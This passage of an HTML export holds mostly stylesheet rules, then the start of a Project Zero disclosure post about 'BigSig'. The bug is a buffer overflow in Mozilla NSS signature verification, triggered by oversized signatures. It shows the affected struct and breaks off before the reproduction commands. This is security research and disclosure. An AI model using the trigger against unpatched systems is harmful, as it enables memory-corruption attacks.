0}ul.lst-kix_oetzaqvyxxoa-2{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-3{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-0{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-1{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-6{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-7{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-4{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-5{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-8{list-style-type:none}ul.lst-kix_4idwybng3hbx-5{list-style-type:none}ul.lst-kix_4idwybng3hbx-4{list-style-type:none}.lst-kix_81cegzboe9ky-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_81cegzboe9ky-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_4idwybng3hbx-7{list-style-type:none}ul.lst-kix_4idwybng3hbx-6{list-style-type:none}.lst-kix_wy7koemfbmv1-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_4idwybng3hbx-8{list-style-type:none}.lst-kix_2gk0zovl15u8-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_81cegzboe9ky-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_81cegzboe9ky-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_81cegzboe9ky-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_wy7koemfbmv1-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_4idwybng3hbx-1{list-style-type:none}ul.lst-kix_4idwybng3hbx-0{list-style-type:none}ul.lst-kix_4idwybng3hbx-3{list-style-type:none}.lst-kix_2gk0zovl15u8-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_4idwybng3hbx-2{list-style-type:none}.lst-kix_prwgb47nvxz6-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2gk0zovl15u8-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_81cegzboe9ky-1{list-style-type:none}ul.lst-kix_81cegzboe9ky-0{list-style-type:none}ul.lst-kix_81cegzboe9ky-3{list-style-type:none}ul.lst-kix_81cegzboe9ky-2{list-style-type:none}.lst-kix_z8xtsan2wa5s-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_z8xtsan2wa5s-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_z8xtsan2wa5s-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_prwgb47nvxz6-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_z8xtsan2wa5s-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_z8xtsan2wa5s-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_prwgb47nvxz6-1&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_q4elz23jmthh-4{list-style-type:none}ol.lst-kix_q4elz23jmthh-3{list-style-type:none}ol.lst-kix_q4elz23jmthh-3.start{counter-reset:lst-ctn-kix_q4elz23jmthh-3 0}ol.lst-kix_q4elz23jmthh-6{list-style-type:none}ol.lst-kix_q4elz23jmthh-5{list-style-type:none}ol.lst-kix_q4elz23jmthh-0{list-style-type:none}ol.lst-kix_q4elz23jmthh-2{list-style-type:none}ol.lst-kix_q4elz23jmthh-1{list-style-type:none}.lst-kix_prwgb47nvxz6-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_prwgb47nvxz6-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_z8xtsan2wa5s-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_prwgb47nvxz6-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_z8xtsan2wa5s-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_z8xtsan2wa5s-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_prwgb47nvxz6-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_prwgb47nvxz6-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_2gk0zovl15u8-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_q4elz23jmthh-6&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-6}.lst-kix_2gk0zovl15u8-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2gk0zovl15u8-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_cw1yal3teuur-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2gk0zovl15u8-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_cw1yal3teuur-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_cw1yal3teuur-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_q4elz23jmthh-4&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-4}ol.lst-kix_q4elz23jmthh-8{list-style-type:none}ol.lst-kix_q4elz23jmthh-7{list-style-type:none}.lst-kix_z8xtsan2wa5s-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_cw1yal3teuur-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_cw1yal3teuur-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_cw1yal3teuur-3&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_q4elz23jmthh-4.start{counter-reset:lst-ctn-kix_q4elz23jmthh-4 0}.lst-kix_cw1yal3teuur-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_cw1yal3teuur-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_cw1yal3teuur-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_4idwybng3hbx-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_4idwybng3hbx-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_4idwybng3hbx-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_q4elz23jmthh-0&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-0}.lst-kix_4idwybng3hbx-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_4idwybng3hbx-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_4idwybng3hbx-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_x7i5vtjupm2f-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_x7i5vtjupm2f-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_x7i5vtjupm2f-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ohd9cwgi2ci1-4&gt;li:before{content:\"\\0025cf  \"}.lst-kix_2fd9br43vo52-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_fvn7czyjg1wz-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_x7i5vtjupm2f-8{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-1{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-4{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-0{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-5{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-3{list-style-type:none}.lst-kix_2fd9br43vo52-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_x7i5vtjupm2f-6{list-style-type:none}.lst-kix_fvn7czyjg1wz-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_ohd9cwgi2ci1-2{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-7{list-style-type:none}.lst-kix_ohd9cwgi2ci1-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_x7i5vtjupm2f-0{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-1{list-style-type:none}ul.lst-kix_prwgb47nvxz6-8{list-style-type:none}.lst-kix_4idwybng3hbx-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_x7i5vtjupm2f-2{list-style-type:none}.lst-kix_x7i5vtjupm2f-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_x7i5vtjupm2f-3{list-style-type:none}.lst-kix_ohd9cwgi2ci1-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_2fd9br43vo52-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_fvn7czyjg1wz-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_wy7koemfbmv1-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_prwgb47nvxz6-2{list-style-type:none}ul.lst-kix_prwgb47nvxz6-3{list-style-type:none}ul.lst-kix_prwgb47nvxz6-0{list-style-type:none}ul.lst-kix_prwgb47nvxz6-1{list-style-type:none}ul.lst-kix_prwgb47nvxz6-6{list-style-type:none}ul.lst-kix_prwgb47nvxz6-7{list-style-type:none}ul.lst-kix_prwgb47nvxz6-4{list-style-type:none}ul.lst-kix_prwgb47nvxz6-5{list-style-type:none}.lst-kix_wy7koemfbmv1-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ugjdqlaeq7aq-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_wy7koemfbmv1-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_ohd9cwgi2ci1-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ugjdqlaeq7aq-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_2fd9br43vo52-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_fvn7czyjg1wz-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_ugjdqlaeq7aq-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_ugjdqlaeq7aq-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_q4elz23jmthh-1&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-1}.lst-kix_ohd9cwgi2ci1-8&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_q4elz23jmthh-1.start{counter-reset:lst-ctn-kix_q4elz23jmthh-1 0}.lst-kix_q4elz23jmthh-8&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-8}.lst-kix_q4elz23jmthh-2&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-2}.lst-kix_81cegzboe9ky-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_81cegzboe9ky-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_81cegzboe9ky-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2fd9br43vo52-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_wy7koemfbmv1-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_81cegzboe9ky-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_2gk0zovl15u8-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_2gk0zovl15u8-0{list-style-type:none}ul.lst-kix_2gk0zovl15u8-2{list-style-type:none}.lst-kix_2gk0zovl15u8-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_2gk0zovl15u8-1{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_2gk0zovl15u8-4{list-style-type:none}ul.lst-kix_2gk0zovl15u8-3{list-style-type:none}ul.lst-kix_cw1yal3teuur-5{list-style-type:none}.lst-kix_prwgb47nvxz6-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_2gk0zovl15u8-6{list-style-type:none}ul.lst-kix_cw1yal3teuur-4{list-style-type:none}ul.lst-kix_2gk0zovl15u8-5{list-style-type:none}ul.lst-kix_cw1yal3teuur-7{list-style-type:none}ul.lst-kix_2gk0zovl15u8-8{list-style-type:none}ul.lst-kix_cw1yal3teuur-6{list-style-type:none}ul.lst-kix_2gk0zovl15u8-7{list-style-type:none}ul.lst-kix_cw1yal3teuur-8{list-style-type:none}ul.lst-kix_cw1yal3teuur-1{list-style-type:none}ol.lst-kix_q4elz23jmthh-2.start{counter-reset:lst-ctn-kix_q4elz23jmthh-2 0}ul.lst-kix_cw1yal3teuur-0{list-style-type:none}ul.lst-kix_cw1yal3teuur-3{list-style-type:none}ul.lst-kix_cw1yal3teuur-2{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c15{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c6{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:italic}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c31{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.3;text-align:left;height:11pt}.c13{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c19{background-color:#ffffff;font-size:8pt;font-family:Consolas,\"Courier New\";color:#009900;font-weight:400}.c34{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.3;text-align:left}.c12{background-color:#ffffff;font-size:8pt;font-family:Consolas,\"Courier New\";color:#993333;font-weight:400}.c1{background-color:#ffffff;font-size:8pt;font-family:Consolas,\"Courier New\";color:#212529;font-weight:400}.c45{color:#333333;text-decoration:none;vertical-align:baseline;font-size:30pt;font-family:\"Amatic SC\"}.c7{font-size:8pt;font-family:Consolas,\"Courier New\";color:#333333;font-weight:400}.c4{margin-left:36pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.c14{border-spacing:0;border-collapse:collapse;margin-right:auto}.c26{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c11{color:#000000;font-weight:400;font-size:11pt;font-family:\"Arial\"}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c10{font-size:8pt;font-family:Consolas,\"Courier New\";color:#0000ff;font-weight:400}.c40{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c24{color:#000000;font-weight:700;font-size:11pt;font-family:\"Arial\"}.c0{font-size:9pt;font-family:Consolas,\"Courier New\";color:#333333;font-weight:400}.c18{font-size:8pt;font-family:Consolas,\"Courier New\";color:#008080;font-weight:400}.c5{font-size:9pt;font-family:Consolas,\"Courier New\";color:#0000ff;font-weight:400}.c30{color:#000000;font-weight:400;font-size:10pt;font-family:\"Arial\"}.c42{background-color:#ffffff;font-size:8pt;color:#b1b100}.c47{font-weight:400;font-size:8pt;font-family:\"Arial\"}.c28{background-color:#ffffff;font-size:8pt;color:#000066}.c38{background-color:#ffffff;font-size:8pt;color:#ff0000}.c23{background-color:#ffffff;font-size:8pt;color:#339933}.c8{text-decoration:none;vertical-align:baseline;font-style:normal}.c50{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c46{text-decoration:none;vertical-align:baseline;font-style:italic}.c51{background-color:#ffffff;font-size:8pt;color:#0000dd}.c9{color:inherit;text-decoration:inherit}.c27{margin-left:36pt;padding-left:0pt}.c17{padding:0;margin:0}.c22{font-size:9pt;color:#008000}.c21{font-weight:400;font-family:Consolas,\"Courier New\"}.c33{orphans:2;widows:2}.c44{width:33%;height:1px}.c35{font-weight:400;font-style:italic}.c48{font-size:8pt;color:#8b0000}.c29{height:0pt}.c39{font-size:11pt}.c32{font-weight:700}.c41{font-size:10pt}.c20{vertical-align:super}.c49{height:11pt}.c36{color:#000000}.c16{page-break-after:avoid}.c37{font-size:5pt}.c43{margin-left:36pt}.c25{font-size:9pt}.title{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#000000;font-size:10pt;padding-bottom:0pt;font-family:\"Arial\";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c50\"&gt;&lt;div&gt;\n &lt;p class=\"c3 c33 c16 subtitle\" id=\"h.hkm9sn4jh6p1\"&gt;&lt;span class=\"c30 c8\"&gt;Posted by Tavis Ormandy, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c13 c16\" id=\"h.ce7bhufj5ofg\"&gt;&lt;span class=\"c24 c8\"&gt;Introduction&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;This is an unusual blog post. I normally write posts to highlight some hidden attack surface or interesting complex vulnerability class. This time, I want to talk about a vulnerability that is neither of those things. The striking thing about this vulnerability is just how simple it is. This should have been caught earlier, and I want to explore why that didn&amp;rsquo;t happen.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;In 2021, all good bugs need a catchy name, so I&amp;rsquo;m calling this one &amp;ldquo;BigSig&amp;rdquo;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;First, let&amp;rsquo;s take a look at the bug, I&amp;rsquo;ll explain how I found it and then try to understand why we missed it for so long.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c13 c16\" id=\"h.7ttrpxxbs2f9\"&gt;&lt;span class=\"c24 c8\"&gt;Analysis&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Overview\"&gt;Network Security Services&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(NSS) is Mozilla&amp;#39;s widely used, cross-platform cryptography library. &lt;/span&gt;&lt;span&gt;When you verify an ASN.1 encoded digital signature&lt;/span&gt;&lt;span&gt;, NSS will create a &lt;/span&gt;&lt;span class=\"c26 c21\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/cryptohi/secvfy.c#120\"&gt;VFYContext&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;structure to store the necessary data. This includes things like the public key, the hash algorithm, and the signature itself.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.9a4d5980e1b13f527ae3eec9673b5d4e7a7010ba\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"c14\"&gt;&lt;tbody&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c10\"&gt;struct&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c18\"&gt;VFYContextStr&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c18\"&gt;SECOidTag&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;hashAlg; &lt;/span&gt;&lt;span class=\"c21 c48\"&gt;/* the hash algorithm */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c18\"&gt;SECKEYPublicKey&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;*key;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;union&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;char&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;buffer[1];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;char&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;dsasig[DSA_MAX_SIGNATURE_LEN];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;char&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;ecdsasig[2 * MAX_ECKEY_LEN];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;char&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;rsasig[(RSA_MAX_MODULUS_BITS + 7) / 8];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp; &amp;nbsp;} u;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;int&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;pkcs1RSADigestInfoLen;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;char&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;*pkcs1RSADigestInfo;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;void&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;*wincx;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;void&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;*hashcx;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c10\"&gt;const&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c18\"&gt;SECHashObject&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;*&lt;/span&gt;&lt;span class=\"c7\"&gt;hashobj&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c18\"&gt;SECOidTag&lt;/span&gt;&lt;span class=\"c7\"&gt;&amp;nbsp;encAlg; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c21 c48\"&gt;/* enc alg */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c18\"&gt;PRBool&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;hasSignature;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c18\"&gt;SECItem&lt;/span&gt;&lt;span class=\"c7 c8\"&gt;&amp;nbsp;*params;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34\"&gt;&lt;span class=\"c7\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c3 c16 c33 subtitle\" id=\"h.scw51sqnutu4\"&gt;&lt;span class=\"c32\"&gt;Fig 1&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=\"c21\"&gt;VFYContext&lt;/span&gt;&lt;span class=\"c30 c8\"&gt;&amp;nbsp;structure from NSS.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c13\"&gt;&lt;span&gt;&lt;br&gt;The maximum size signature that this structure can handle is whatever the largest union member is, in this case that&amp;rsquo;s RSA at &lt;/span&gt;&lt;span class=\"c26\"&gt;&lt;a class=\"c91\" href=\"https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/freebl/blapit.h#139\"&gt;2048 bytes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class=\"c11 c8\"&gt;&amp;nbsp;That&amp;rsquo;s 16384 bits, large enough to accommodate signatures from even the most ridiculously oversized keys.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;Okay, but what happens if you just....make a signature that&amp;rsquo;s bigger than that?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;Well, it turns out the answer is memory corruption. Yes, really.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;br&gt;The untrusted signature is simply copied into this fixed-sized buffer, overwriting adjacent members with arbitrary attacker-controlled data.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c13\"&gt;&lt;span class=\"c11 c8\"&gt;The bug is simple to reproduce and affects multiple algorithms. The easiest to demonstrate is RSA-PSS. In fact, just these three commands work:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c11 c8\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.488dd1b55b75f3df66e36d7bc8b67538aa8c4fd3\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"c14\"&gt;&lt;tbody&gt;&lt;tr class=\"c29\"&gt;&lt;td class=\"c15\" 